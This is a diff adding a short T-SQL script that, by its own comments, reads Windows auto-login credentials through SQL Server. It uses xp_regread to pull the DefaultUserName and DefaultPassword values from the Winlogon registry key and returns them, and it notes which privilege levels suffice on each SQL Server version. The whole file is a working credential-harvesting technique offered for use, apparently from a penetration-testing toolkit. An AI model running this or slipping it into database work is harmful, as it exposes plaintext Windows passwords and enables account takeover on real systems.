@@ -1,0 +1,22 @@
+-- Get the Windows auto login credentials through SQL Server using xp_regread
+-- Requirements
+-- 2014 or later = sysadmin
+-- 2000 to 2012 = public role with execute privs on xp_regread (default)
+
+-- Get AutoLogin DefaultUsername
+DECLARE @AutoLoginUser  SYSNAME
+EXECUTE master.dbo.xp_regread
+@rootkey		= N'HKEY_LOCAL_MACHINE',
+@key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+@value_name		= N'DefaultUserName',
+@value			= @AutoLoginUser output
+
+-- Get AutoLogin DefaultUsername
+DECLARE @AutoLoginPassword  SYSNAME
+EXECUTE master.dbo.xp_regread
+@rootkey		= N'HKEY_LOCAL_MACHINE',
+@key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
+@value_name		= N'DefaultPassword',
+@value			= @AutoLoginPassword output
+
+SELECT @AutoLoginUser, @AutoLoginPassword
